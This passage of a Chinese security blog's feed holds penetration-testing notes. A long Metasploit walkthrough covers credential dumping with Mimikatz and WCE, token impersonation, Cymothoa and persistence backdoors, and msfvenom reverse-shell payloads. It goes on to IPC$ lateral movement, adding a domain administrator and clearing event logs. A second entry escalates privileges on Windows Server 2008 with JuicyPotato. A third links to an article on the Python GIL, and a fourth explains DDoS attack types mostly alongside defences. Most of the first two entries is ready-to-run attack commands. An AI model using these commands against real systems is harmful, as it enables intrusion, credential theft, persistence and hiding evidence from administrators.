列出可用的token(会看到结果，根据Meterpreter shell的权限而定) # 假设从输出信息中看到了目标机器的..., 继续在incognito中执行 impersonate_token WIN7-TEST\\Administrator # 调用incognito中的这个impersonate_token 命令，来假冒Admin进行攻击(注意是两个反斜杠) shell whoami # 查看权限 Hash攻击 ###### 1.是使用Hashdump抓取密码 hashdump # 导出主机的sam数据库的hash # 另一个更强大的模块 run winsows/gather/smart_hashdump # 若是win7,且开启了uac，就要使用绕过uac的模块再继续 ##### 2.使用Quarks PwDump抓取密码 win32下的一款工具，导出信息十分全面，支持系统版本十分广泛 具体参数再查 QuarksPwDump.exe -dh1 -o 1.txt # 还可配合在 Ntdsutil 工具到处DC的密码 ps: win的密码会加密存放在/windows/system32/config/sam ##### 3.使用Windows Credentials Editor抓取密码 WCE(Windows Credentials Editor) 功能强大，不过必须是管理员权限，还要主要免杀 # 先上传wce到目标 upload wce.exe # 在目标的shell下执行 wce -w # 便会成功提取明文管理员密码(默认是-l命令读取，-f强制安全方式读取，-g用来计算密码，-c制定会话来执行cmd，-v显示详细信息，-w最关键 --> 查看已登录的明文密码) ##### 4.使用Mimikatz抓取密码 msf内置了Mimikatz成为一个peterpreter脚本集成 load Mimikatz help Mimikatz # mimikatz_command # 可以让我们使用Mimikatz全部功能, 如(:: 请求某个模块可用的选项) mimikatz_command -f hash:: mcv # 抓取系统hash值 kerberos # 抓取系统票据 wdigest # 获取系统账户信息 mimikatz_command -f samdump::hash # 抓取hash ## mimikatz 除了抓取hash，还有其他功能：比如 Handle模块，list\kill进程，模拟用户令牌等 mimikatz_command -f handle:: mimikatz_command -f service:: # servvice模块可以对win的服务进行... mimikatz_command -f crypto:: # crypto可以列出 导出任何证书，以及存储在目标机器上的相应的私钥 # mimikatz 也支持PowerShell调用 脚本P228 能在PowerShell中执行mimikatz，偷窃和注入凭证，伪造Kerbero票证创建，还有其他很多功能 后渗透攻击：移植漏洞利用代码模块支持不同语言编写的模块移植进去，允许开发者开发自己的漏洞利用模块 MS17-010 –&gt; 微软SMB远程代码执行漏洞 演示：移植MS17-010漏洞利用代码 # MS17-010 在msf中虽然有集成脚本，但是不适用于03系统，从网上自行下载 # clone脚本到本地，把rb脚本复制到/usr/share/metasploit-framework/modules/exploits/windows/smb下 raload all # 然后在msf中重新加载脚本 之后就能search到了，用use加载它 # 开始 msfovenom 生成一个DLL文件(在下面set payload) 然后设置该模块的参数 run 后渗透攻击：后门提取完成之后，就需要留后门了 1.操作系统后门 ##### 1.Cymothoa后门 可以将ShellCode注入到现有进程的后门工具 该后门能与被注入进程共存，且如果不检查内存是发现不了的 该后门注入系统的某一进程，返回的是该进程相应的权限(并不需要root)， 但是关闭进程或重启，后门就会停止运行 ps -aux # 查看程序的pid， Win下是 tasklist # -p指定目标进程的PID，-y指定payload服务端口，-s指定ShellCode编号(cymothoa -S 查看) cymothoa -p 862 -s 1 -y 5555 # 连接后门 nc -nvv 192.168.0.112 5555 ##### 2.Persistence后门 使用安装自启动方式的持续型后门，可以用它创建注册表和文件 run persistence -h # 查看命令选项 # 创建持久型后门 run persistence -A -S -U -i 60 -p 4321 -r 162.168.0.112 # -A自动启动payload，-S系统启动时自动加载，-U用户登录时自动启动， -X开机时自动加载，-i回连时间间隔，-P监听端口号， -r 目标机器地址 sessions # 发现会话已成功获取 2.Web后门(WebShell) # 中国菜刀，AntSword， Cknife， 冰蝎，Weevely(kali使用最多，但是只支持php)，msf也有自带的后门 ##### 1. Meterpreter 后门 msf中有一个叫 php meterpreter 的payload，里哟你他可以创建具有Meterpreter功能的php webshell # 使用msfvenom创建一个webshell msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=1234 -f raw > p.php # 上传webshell到目标机器 # 本机运行 msf multi-handler 开始监听 use exploit/multi/handlers set payload php/meterpreter/reverse_tcp ... run # 访问webshell页面 # 获得反弹的 Metasploit Shell ##### 2. Aspx Meterpreter 后门 msf下的 shell_reverse_tcp 的payload，可以创建多个版本的具有meterpreter功能的Shellcode 这里以aspx为例, 步骤和上面的那个大致相同 show payloads use windows/shell_reverse_tcp set ... save generate -h # 查看帮助 generate -t aspx # 生成aspx版本的ShellCode # 保存内容到x.aspx，上传到服务器 # 本地设置监听 use exploit/multi/handlers set payload windows/meterpreter/reverse_tcp ... run # 访问webshell页面 # 获得反弹的 Metasploit Shell 后续就可以进行提权等操作了 msf基础命令search ms17 # 查找 use exploit/multi/handler # 使用 info # 查看信息 show expoits/payloads/options # 显示可用信息 exploit /run # 执行 back # 返回上一级 exploit -j # 后台运行 sessions # 查看当前可用会话 session -i 1 # 连接某个会话 sessions -K # 杀死所有活跃会话 Meterpreter命令：getuid # 查看用户名，从而查看当前会话具有的权限 sysinfo # 列出主机信息 getprivs # 尽可能多地获取目标主机上的特权 getystem # 通过各种攻击向量来提升到系统用户权限 hashdump # 导出目标主机中的口令哈希值 screenshot # 屏幕截图 background # 将当前的meterpreter shell转为后台执行 quit # 关闭当前meterpreter会话，回到msf终端 ps # 显示所有运行进程 migrate PID # 迁移到制定的进程PID execute -f cmd.exe -i # 执行cmd.exe命令并进行交互 shell # 以所有可用令牌来进行一个交互的shell msfvenom基础# 参考：msf下的各种生成payload命令 http://www.cnblogs.com/backlion/p/6000544.html ### 二进制 # Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f elf > shell.elf # Windows 生成exe程序 msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f exe > shell.exe msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.105 lport=4444 -f exe -o /var/www/html/payload.exe # Mac msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f macho > shell.macho ### Web Payloads # PHP msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.php cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' > shell.php &amp;&amp; pbpaste >> shell.php # ASP msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f asp > shell.asp # JSP msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.jsp # WAR msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f war > shell.war ### Scripting Payloads # Python msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.py # Bash msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.sh # Perl msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.pl ### Shellcode: # Linux Based Shellcode msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language> # Windows Based Shellcode msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language> # Mac Based Shellcode msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language> ### Handler use exploit/multi/handler set PAYLOAD &lt;Payload name> set LHOST &lt;LHOST value> set LPORT &lt;LPORT value> set ExitOnSession false exploit -j -z 反弹Shell### 第一种(这个监听更综合一点)： use exploit/multi/hander # 1.msfvenom生成程序 # 2.使用handler执行exp # 3.在目标机器运行msfvenom生成程序 # 4.返回session ### 第二种： use exploit/multi/script/web_delivery # 1.使用web_delivery返回脚本执行并加载exp # 2.在目标机器运行脚本 # 3.返回session # Note: 这里要使用的payload与上面使用生成器生成的名字要一致 一些小思路信息搜集当拿下第一天内网主机的权限(提权不了时)，就要以此服务器为跳板攻击其他服务器 先进行网络/用户组/DC等的收集 获取另外一台服务器权限若权限不够导致不能直接攻击域服务器 使用meterpreter当前拥有的权限添加到内网路由，进行弱口令扫描 用Powershell对内网进行扫描 架设Socks4a, 然后socks会自动进行内网扫描 利用当前权限进行内网IPC$渗透 其他 通过分析，我们输入net view, 发现列举的机器选择一个和我们机器名相似的服务器试，成功率一般很高net use \\WIN7_TEST2\c$ 使用经典的IPC$入侵（通过win默认启动的ipc共享来获得计算机控制权）： net use \192.168.0.112\ipc$ # 连接这个ip的ipc共享 copy srv.exe \192.168.0.112\ipc$ # 复制srv(免杀的payload)到目标 net time \192.168.0.112 # 查看时间 at \192.168.0.112 18:18 srv.exe # 用at命令在18点18分启动srv.exe (这里设置的时间要比主机时间快) # 如果没有 at命令，试试新的计划任务命令： schtask # 回到msf的handler进行监听，到时间会反弹shell 然后进入这个新的主机，查看包括权限在内的信息, 也可以mimikatz抓密码: run /post/windows/gather/mimikatz 也可以上传对应位数的mimikatz到该主机 upload /home/x64.exe c:\ shell # 进入到目标的shell，再执行 Powershell寻找域管在线服务器使用PowerView脚本的Invoke-User Hunter上传到目标机器，然后执行Invoke-UserHunter powershell.exe -exec bypass -Command "&amp;{Import-Module .powerview.ps1;Invoke-UserHunter}" 找到域管理员当前在线登录的主机后，入侵该主机，然后把它迁移到域管理员登录所在的进程，这样就有了域管的理的权限 获取域管权限渗透域控 # 先尝试 getsystem getuid #查看当前用户，因为之前知道这账户的域管理员 ps # 找到域管理所在进程 migrate 30560 # 迁移进程过去(也可以用msf中窃取令牌的功能) # 查看主域控的IP shell # 先进去cmd net time # 使用IPC$入侵来返回一个域控的meterpreter shell(操作见上面的步骤) net user test test123 /ad /domain # 添加域管理员 net group "domain admins" /domain #查看域管理员是否添加成功 登录域控下面要登录域控，抓取hash 常见的登录域控的方法： - 利用IPC上传AT&amp;Achtasks远程执行命令 - 利用端口转发或Socks登录DC的3389 - 登录对方内网一台主机使用PsTools工具包中的PsExec来反弹shell - 使用msf下的PsExec，psexec_psh, Impacket psexec, pth-winexe, Empire Invoke-Psexec等PsExec类工具反弹shell - 使用msf下的smb_login反弹shell - 使用WMI来进行攻击 - 使用PsRemoting posershel远程执行命令 - 其他 最常见的是msf下的PsEcex反弹meterpreter(1.msf下的PsEcex模块 2.cuestom模块,建议使用Veil之类的工具来生成免杀的payload) use /exploit/windows/smb/psexec set smbuser test set smbpass test123 set smbdomain HACKER set rhost 192.168.0.111 run # 获得反弹的meterpreter shell之后，先迁移进程，查看DC的系统系统和sesssion控制图 ps migrate 2166 getuid sysinfo sessions # 查看我们获取的sessions # 抓hash方法： - msf自带的hashdump(有system权限才可以)或smart_dump模块导出用户的Hash - 使用PowerShell的相应模块导出hash - 使用WCE、Mimikatz等工具 - 其他 SMB爆破内网有了DC的密码，接下来只需快速在内网扩大控制权限 利用当前获取的DC的账户密码，对整个域控的IP短进行扫描 使用SMB下的smb_login模块 端口转发或socks代理进内网 ## 先在msf添加路由，然后使用smb_login模块Huo psexec_Scanner模块进行爆破 background route add 192.168.0.115 255.255.255.0 2 # 目的是访问1192.168.0.115将通过meterpreter的会话 2 来访问： search smb_login use auxiliary/scanner/smb/smb_login set ... run # 扫描内网 creds # 然后获得大量内网服务器的密码，下面就可以畅游内网了 # 可以使用Meterpreter的端口转发，也可以使用Metasploit下的Socks4a模块或第三方软件(这里使用简单的第一种) portfwd add -l 5555 -p 3389 -r 127.0.0.1 background 清理日志步骤 删除之前添加的域管理员的帐号 删除所有在渗透中使用的工具 删除应用程序、系统和安全日志 关闭所有的Meterpreter连接 net user test /dels clearev # 删除日志 sessions sessions -K # 关闭所有msf连接 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ms-16075提权Windows Server 2008]]></title>
    <url>%2Fposts%2F29481%2F</url>
    <content type="text"><![CDATA[光看网上的文章是不够的，还是要多动手才行 ms16-075漏洞简介Windows SMB 服务器特权提升漏洞（CVE漏洞编号：CVE-2016-3225）当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞，成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。漏洞详情，请戳这里 开始动手1.假设是msfvenom生成木马，目标执行了，监听会话，获得meterpreter会话权限 msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.0.103 lport=4444 -f exe > shell.exe 2.先看一下当前权限(确保我没有作弊) 3.查看系统信息，并导出 # (进入cmd) shell chcp 65001 # 将编码格式改为utf-8中文 systeminfo >> c:\out.txt 将系统信息输出到out.txt文件 4.在meterpreter把结果文件下载到本地 download D:\\xxxx\\upload\\out.txt /tmp/out.txt 5.这里选择Windows-Exploit-Suggeste提权辅助工具，对结果文件在本地进行分析, 查找系统未打补丁有哪些 python windows-exploit-suggester.py --update python windows-exploit-suggester.py -i out.txt -d 2020-05-09-mssb.xls -l # -i是systeminfo的结果文件 可以看到可能存在ms16-075漏洞 6.开始验证 # 上传ms16-075的exp: JuicyPotato.exe至靶机 upload /root/Desktop/JuicyPotato.exe C:\\ execute -cH -f C:\\JuicyPotato.exe # 执行poc(前面已经把poc上传到目标了), 创建新的进程 impersonate_token "NT AUTHORITY\\SYSTEM" # 窃取, 假冒目标主机上的可用令牌 7.查看当前权限，提取成功 getuid # 查看当前权限 8.后面的事情，嘿嘿你懂得 这里只是没有防护的情况下的一次简单实验，有点简陋有点水 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>烂土豆</tag>
        <tag>提权</tag>
        <tag>ms-16075</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python进程之间全局锁(GIL)]]></title>
    <url>%2Fposts%2F30441%2F</url>
    <content type="text"><![CDATA[感觉这篇文章写的不错： 点击这里 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>全局锁</tag>
        <tag>GIL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDoS入门学习]]></title>
    <url>%2Fposts%2F64661%2F</url>
    <content type="text"><![CDATA[之前以为DDos很简单，现在发现学问还是大滴很呢！！！ 理论DDOS简介DDOS(Distributed Denial of Service)，又称分布式拒绝服务攻击。是指处于不同位置的多个攻击者同时向一个或数个目标发动攻击，或者一个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击。由于攻击的发出点是分布在不同地方的，这类攻击称为分布式拒绝服务攻击，其中的攻击者可以有多个。分布式拒绝服务攻击方式在进行攻击的时候，可以对源IP地址进行伪造，这样就使得这种攻击在发生的时候隐蔽性是非常好的，同时要对攻击进行检测也是非常困难的，因此这种攻击方式也成为了非常难以防范的攻击。 DDOS危害出口带宽堵死游戏掉线导致客户流失服务器连接数多，连接资源被耗尽服务器卡、慢、死机、无法连接 流量特点IP地址随机或固定某些IP段随机没有完整完成三次握手地址多数是伪造的请求数量大、快 DDOS攻击类型与防御1.Smurf攻击攻击者向网关(网络广播地址)发送ICMP请求包，并将该ICMP请求报文的源地址伪造成受害主机IP地址，目的地址为广播地址。路由器在接受到该数据包，发现目的地址是广播地址，就会将该数据包广播出去，局域网内所有的存活主机都会受到一个ICMP请求包，源地址是受害主机IP。接下来受害主机就会收到该网络内所有主机发来的ICMP应答报文，通过大量返回的ICMP应答报文来淹没受害主机，最终导致网络阻塞，受害主机崩溃。下面是smurf攻击示意图（盗的图） 防护方案： 禁止路由器广播ICMP请求包； 禁止操作系统对广播发出的ICMP请求包做出响应； 配置防火墙静止来自你所处网络外部的ping包 2.TearDrop攻击是一种畸形报文攻击，基于UDP的病态分片数据包的攻击方法。通过设置错误的片偏移(IP分段)，使得数据包到达目的地时，服务器无法重新组合数据包，因为数据包的组合是通过片偏移来组装的，最终导致崩溃。对比一下正常IP数据包和错误IP数据包这种攻击主要对旧的windows版本和Linux版本有效。 防护：可以检测发来的数据包片偏移是否合法，如果合法在组装，不合法直接丢弃。比如这个：分片重组检查算法 3.Land Attack（着陆攻击）攻击者发动Land Attack攻击时，需要先发出一个SYN数据包，并将数据包的源IP与目的IP都设置成要攻击的目标IP，这样目标在接收到SYN数据包后，会根据源IP回应一个SYN+ACK数据包，即和自己建立一个空连接，然后到达idel超时时间时，才会释放这个连接。攻击者发送大量这样的数据包，从而耗尽目标的TCP连接池，最终导致拒绝服务。 Kali Linux提供的很多工具，都可以实现伪造包的功能，如hping3。 防御方案：这种攻击对早期系统有效。通过防火墙、路由设备，建立规则，丢弃源地址和目标地址相同的SYN、SYN+ACK的TCP。 4.YN FLOOD攻击SYN FLOOD攻击是在TCP三次握手过程中产生的。攻击者通过发送大量伪造的带有SYN标志位的TCP报文，与目标主机建立了很多虚假的半开连接，在服务器返回SYN+ACK数据包后，攻击者不对其做出响应，也就是不返回ACK数据包给服务器，这样服务器就会一直等待直到超时。这种攻击方式会使目标服务器连接资源耗尽、链路堵塞，从而达到拒绝服务的目的 防御： SYNCheck：使用防护设备，3次握手变成了6次握手，由防护设备检测SYN请求是否合法，通过后再由防护设备将报文转发给服务器，后续报文仍由防护设备代理。 Micro blocks：管理员可以在内存中为每个SYN请求创建一个小索引(小于16字节)，而不必把整个连接对象存入内存。 RST cookies：在客户端发起第一个SYN请求后，服务器故意回应一个错误的SYN+ACK报文。如果合法用户收到这个报文，就会给服务器响应RST报文。当服务器收到这个报文时，就将这个主机的IP记录进合法IP列表，下次该主机发起SYN请求时，就可以直接通过了。 STACK tweaking：管理员可以调整TCP堆栈以减缓SYN泛洪攻击的影响。这包括减小超时时间，等到堆栈存释内放时再分配连接，否则就随机性地删除传入的连接。 5.ACK FLOOD攻击ACK FLOOD攻击是利用TCP三次握手过程。这里可以分为两种。第一种：攻击者伪造大量的SYN+ACK包发送给目标主机，目标主机每收到一个SYN+ACK数据包时，都会去自己的TCP连接表中查看有没有与ACK的发送者建立连接 ，如果有则发送ACK包完成TCP连接，如果没有则发送ACK+RST 断开连接。但是在查询过程中会消耗一定的CUP计算资源。如果瞬间收到大量的SYN+ACK数据包，将会消耗服务器的大量cpu资源，导致正常的连接无法建立或增加延迟，甚至造成服务器瘫痪、死机。 第二种：利用TCP三次握手的ACK+SYN应答，攻击者向不同的服务器发送大量的SYN请求，这些SYN请求数据包的源IP均为受害主机IP，这样就会有大量的SYN+ACK应答数据包发往受害主机，从而占用目标的网络带宽资源，形成拒绝服务。 通常DDOS攻击会将ACK flood与SYN flood结合在一起，从而扩大威力。 防御方案参考： 采用CDN进行流量稀释； 避免服务器IP暴露在公网上； 通过限速或动态指纹的方式； 利用对称性判断来分析出是否有攻击存在； 在连续收到用户发送的ACK包时，中断回话，让其重连。 6.UDP FLOOD攻击(UDP泛洪攻击)因为UDP不需要三次握手，这就造成UDP泛洪攻击不但效率高，而且还可以在资源相对较少的情况下执行。UDP FLOOD可以使用小数据包(64字节)进行攻击,也可以使用大数据包(大于1500字节,以太网MTU为1500字节)进行攻击。大量小数据包会增大网络设备处理数据包的压力；而对于大数据包，网络设备需要进行分片、重组，最终达到的效果就是占用网络传输接口的带宽、网络堵塞、服务器响应慢等等。 防御方案： 限制每秒钟接受到的流量(可能产生误判)； 通过动态指纹学习(需要攻击发生一定时间)，将非法用户加入黑名单。 7.NTP放大攻击NTP(Network Time Protocol，网络时间协议)，是用来使计算机网络时间同步化的一种协议，使用UDP123端口进行通信。通常在NTP服务器上会有一些调试接口，而利用这些接口中的monlist请求，就可触发放大攻击。当主机向NTP服务器发送monlist查询请求时，NTP服务器会将与之进行时间同步的最后600个IP地址返回。所以攻击者只需要将源地址伪造为受害主机的IP，向NTP服务器发送一个monlist查询请求包，受害主机就会收到大量的UDP响应包。这种攻击在放大攻击里，危害相对较大。 这种攻击产生的原因： 请求与响应数据包不等价； UDP协议的通信模糊性（无数据传输确认机制）； 以及NTP服务器的无认证机制。 防御方案： 使用防 DDoS 设备进行清洗； 加固并升级NTP服务器； 在网络出口封禁 UDP 123 端口； 通过网络层或者借助运营商实施 ACL 来防御； 关闭现在 NTP 服务的 monlist 功能，在ntp.conf配置文件中增加disable monitor选项。 8.DNS放大攻击DNS报文格式(借个图)： 首先，攻击者向僵尸网络发出指令，使僵尸网络中的每一台主机均发出一个伪造源地址的DNS查询请求包，这些请求包查询类型设置为ANY，因为这种类型会请求所有的记录，这些记录会在返回的响应包中，也就是说这种数据包的大小较其他类型是最大的。接着查询类型设为递归查询，为什么不是迭代查询呢，仔细看两种查询的过程图可发现，如果迭代查询第一个请求的DNS服务器没有查询到结果，那么第一个请求的服务器会返回另一个DNS服务器IP，让请求主机向这个IP去继续查询，然而攻击者的数据包源地址是伪造的，所以并不会发起第二次查询，因为第一次查询根本就不是它发起的；而递归查询却是在查询到结果之后，才返回给查询请求发起者。利用这两个特点，攻击者就可以成功发起DNS放大攻击。这种普通的查询请求可以将攻击流量放大2~10倍，如果想增大攻击倍数，可以使用RFC 2671中定义的DNS拓展机制EDNS0。未使用EDNS0时，若响应包大小小于512字节，就使用UDP封装数据；若响应包大小超过512字节，就使用TCP连接或者服务器截断响应报文，丢弃超过512字节的部分，并把TC位置1。这两种方式都不利于进行DNS放大攻击。然而在开启EDNS0机制后，增加了OPT RR字段，这两个字段包含了能够处理的最大UDP报文大小信息，所以攻击者将这个信息设置的很大，服务器就会根据这个信息生成响应报文。最后看一下DNS放大攻击演示图 # 四个步骤 1.攻击者使用受损端点将带有欺骗性IP地址的UDP数据包发送到DNS recursor(递归)。数据包上的欺骗地址指向受害者的真实IP地址。 2.每个UDP数据包都向DNS解析器发出请求，通常会传递诸如“ANY”之类的参数，以便接收可能的最大响应。 3.在收到请求后，尝试通过响应提供帮助的DNS解析器会向欺骗的IP地址发送大量响应。 4.目标的IP地址接收响应，周围的网络基础设施因流量泛滥而变得不堪重负，导致拒绝服务。 虽然一些请求不足以取消网络基础设施，但当此序列在多个请求和DNS解析器之间成倍增加时，目标接收的数据放大可能很大。 防御的话，可以参考以下几点： 联系ISP清洗上游流量； DNS服务器只对可信域内提供服务，限制对域外用户提供DNS解析服务； 对单个IP的查询速率做限制； 拥有足够的带宽承受小规模攻击； 关闭DNS服务器的递归查询； 利用防火墙等对ANY Request进行过滤。 源IP验证 - 停止欺骗数据包离开网络 9.SNMP放大攻击SNMP(Simple Network Management Protocol，简单网络管理协议)，它使用UDP 161端口进行通信攻击者向互联网上开启SNMP服务的设备发送GetBulk请求，并使用默认通信字符串作为认证凭据。常见的默认通信字符串如public、private以及一些厂商默认的通信字符串。GetBulk请求是在SNMPv2中添加的的，该请求会让SNMP设备尽可能多的返回数据，这也就是SNMP放大攻击的利用点 攻击者先将源地址改成要攻击的目标IP，再使用默认的通信字符串，向大量SNMP设备发出GetBulk请求，设备收到GetBulk请求数据包后，会将一大段的设备检索信息返回给目标主机，最终目标主机会被这些SNMP设备返回的数据包淹没，导致拒绝服务。 防御措施： 禁止已开启SNMP的设备响应GetBulk请求，避免自己的设备被黑客利用； 更改默认的通信字符串； 修改默认端口161； 隐藏开启SNMP设备的公网IP 10.TFTP放大攻击TFTP（Trivial File Transfer Protocol，简单文件传输协议），使用UDP 69端口进行通信。由于TFTP使用的是不可靠的UDP协议，所以他不能确保发送的任何报文都能真正到达目的地，因此他必须使用定时器来检测并重传报文 FTP协议将数据分成好多个数据块进行传输，每个数据块最大为512字节，客户端在接受到数据块时，需要给服务器端返回一个ACK确认报文，然后才会继续传输下一个报文。若服务器没有收到客户端发来ACK报文，则在时间到达超时计数器时，便会开启重传机制，这也就是攻击利用点。攻击者利用TFTP协议上的缺陷，伪造源地址向服务器发起请求，服务器回复的第1个data数据包后无法收到客户端发送的ACK。此时TFTP就会利用他的重传机制，定时重传第1个data数据包，当攻击者发出大量的这种请求时，TFTP放大攻击也就发生了 防御方案可参考如下： 不要将TFTP服务器暴露在公网上； 对流经TFTP服务的流量进行入侵检测； 将重传（数据包）率设置为1； 只为信任域内的主机提供服务。 11.CC攻击CC攻击（ChallengeCollapsar）又称作HTTP 泛洪攻击。原理是攻击者控制肉鸡、僵尸网络或使用代理服务器，不停地向目标的web服务发送大量合法请求，使得正常用户的web请求处理缓慢甚至得不到处理，制造大量的后台数据库查询动作，消耗目标CPU资源，最终导致服务器宕机崩溃。这种攻击方式不需要很大的带宽，且无法使用伪造IP地址进行攻击，需要真实的机器与web服务器建立连接，因为HTTP协议是建立在TCP协议上，必须先进行TCP三次握手才能进行HTTP通信。如果目标web服务器支持HTTPS，那么发起的HTTPS泛洪攻击还能穿透一些防护设备。 ddos攻击和cc攻击区别知主要是针对对象的不同：ddos是主要针对IP的攻击，而CC攻击的主要是网页。CC攻击相对来说，攻击的危害不是毁灭性的，但是持续时间长;而ddos攻击就是流量攻击，这种攻击的危害性较大，通过向目标服务器发送大量数据包，道耗尽其带宽，更难防御。 防御方案： 必要时将网页做成静态，减少数据库的使用； 通过缓存的方式进行，尽量由设备的缓存直接返回结果来保护后端业务 Token随IP地址变化 限制连接数量； 修改最大超时时间； 让用户手动输入验证码； 在response报文中添加特殊字段，验证IP合法性； 屏蔽频繁访问服务器的主机IP。 一个防CC攻击的脚本：https://zhangge.net/4649.html 参考文章：https://www.jianshu.com/p/dff5a0d537d8 12.HTTP慢速攻击Slow HTTP Dos AttACKs（慢速HTTP拒绝服务攻击）黑客模拟正常用户向web服务器发送慢速http请求，由于是慢速的，服务器端需要保持连接资源，直到数据传输结束或请求结束才可释放连接。当服务器端建立了大量这样的慢速连接，就会导致服务器拒绝服务。这种攻击可以分为两类：一类是客户端发数据，另一类是客户端读取服务器发来的数据。HTTP慢速攻击对基于线程处理的web服务器影响显著，如apache、dhttpd，而对基于事件处理的web服务器影响不大，如nginx、lighttpd。 HTTP慢速攻击还可以细分成以下几种攻击方式：a. Slowloris攻击方式 HTTP协议规定请求头以一个空行结束，所以完整的http请求头结尾是\r\n\r\n。 然而'使用非正常的\r\n来结尾'，就会导致服务端认为我们的请求头还没结束，等待我们继续发送数据直到超时时间。 # CRLF（Carriage Return Line Feed）表示回车换行 b. Slow post攻击方式 在http头部信息，可以使用content-length声明HTTP消息实体的传输长度，服务器端会content-length的值作为HTTP BODY的长度。 利用这一特点，攻击者'把content-length设置得很大的，然后缓慢发送数据部分'，比如一次只发送一个字节，这样服务器端就要一直保持连接，直到客户端传完所有的数据。 # 利用工具 slowloris https://github.com/gkbrk/slowloris.git 参考文章：https://www.fujieace.com/hacker/tools/slowloris-dos.html c. Slow read攻击方式 攻击者发送一个完整的HTTP数据请求，之后服务器会给出响应，这时攻击者再'将自己的TCP窗口大小设置的很小'，服务器会根据客户的TCP窗口大小来传送数据。 由于客户端的TCP窗口大小很小，服务器只能缓慢的传输数据给客户端。当建立大量的这种连接时，web应用的并发连接池将被耗尽，最终导致拒绝服务。 d. Apache range header攻击 # 这种攻击方式只针对apache 当客户端传输大文件时会有range字段，表示将大文件分段，分成几个小段进行传输。 例如攻击者将一个文件按照一个字节一段，分成好多段，这样就会造成传输数据缓慢，长时间占用连接，消耗服务器CPU和内存资源 防御这里至只看apache的防护策略(具体的需要实践) # 设置并使用以下模块 mod_reqtimeout 模块 # 控制请求数据传输的超时时间及最小速率 mod_qos 模块 # Apache的一个服务质量控制模块，用户可配置各种不同阈值 mod_security模块 # 一个开源的WAF模块，有专门针对慢速攻击防护的规则 对于其他中间件：参考文章 13.XSS-DOS利用网站存在的存储型XXS漏洞，在网站中插入恶意的javascript代码。代码的功能是不断向web服务器发起大量请求，从而导致服务器宕机，无法响应正常用户的请求 由于这种攻击的是由存储型XSS导致的，我们再防御方面就要考虑如何防御存储型XSS。防御策略如下： 对用户的输入以及url参数进行特殊字符过滤； 对输出内容进行编码转换； 结合黑白名单机制; 等防御存储型XSS的方式 14.时间透镜攻击通过控制相同源和相同目的IP报文，使得走不同路径的数据包，在同一时刻到达目标服务器，从而达到流量集中攻击的目的。 防御方案： 增加抖动，干扰攻击路径，使得数据包无法预期到达； 由运营商禁止源路由。 采用高性能的网络设备； 充足的网络带宽保证； 升级主机服务器硬件； 避免将服务器的真实IP暴露在公网中； 使用CDN对流量进行稀释，当大流量稀释到各个CDN节点时，再对流量进行清洗，从而达到防护源站的目的（然而这种防御方式只能用在对域名发起的DDOS攻击，如果攻击者直接对IP进行攻击，则需要使用anycast技术来防御）。 